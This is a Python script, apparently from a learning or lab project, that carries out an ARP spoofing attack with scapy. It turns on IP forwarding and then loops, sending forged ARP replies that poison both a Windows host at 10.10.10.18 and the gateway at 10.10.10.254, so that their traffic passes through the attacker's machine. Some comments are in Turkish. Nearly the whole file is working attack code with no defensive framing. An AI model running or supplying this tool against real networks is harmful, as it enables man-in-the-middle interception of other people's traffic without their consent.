import optparse
import subprocess
import os
import scapy.all as scapy
import time
import sys


def ip_forwarding_ac():
    print("[*] IP Forwarding is being enabled...")
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("[+] IP Forwarding has been successfully ENABLED.")
    except PermissionError:
        print("[-] Error: Access denied! Please run with 'sudo'.")
    except Exception as e:
        print(f"[-] An unexpected error: {e}")


# Parser settings
parse_object = optparse.OptionParser()
parse_object.add_option("-e", "--enable", dest="enable_forward", action="store_true")
(user_inputs, arguments) = parse_object.parse_args()

if user_inputs.enable_forward:
    ip_forwarding_ac()
else:
    print("[*] The -e parameter was not entered, so the IP forwarding process is skipped.")


def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[-] Hata: {ip} adresinden MAC alınamadı. IP doğru mu?")
        return None


def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)

    if target_mac:
        packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
        scapy.sendp(packet, verbose=False)
    else:
        pass  # MAC bulunamadıysa paketi gönderme


packet_number = 0
try:
    print("[*] Initiating an ARP spoofing attack (CTRL+C to exit)...")
    while True:
        # Windows'u kandır (Ben modemim)
        arp_poisoning("10.10.10.18", "10.10.10.254")
        # Modemi kandır (Ben Windows'um)
        arp_poisoning("10.10.10.254", "10.10.10.18")

        packet_number += 2
        print(f"\r[+] Number of packets sent: {packet_number}", end="")
        time.sleep(3)

except KeyboardInterrupt:
    print("\n[-] The attack was stopped (CTRL+C).")